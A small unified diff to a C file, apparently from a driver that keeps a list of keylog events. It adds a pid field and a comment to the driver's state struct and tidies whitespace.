@@ -55,10 +55,12 @@ typedef struct event_struct {
  * 
  * events_head - head of the keylog event list
  * total_events - number of total events (bonus)
+ * pid - pid
 */
 typedef struct drv_struct {
 	event_struct *events_head;
-	int total_events; 	
+	pid_t pid;
+	int total_events;
 } drv_struct ;
 
 /**
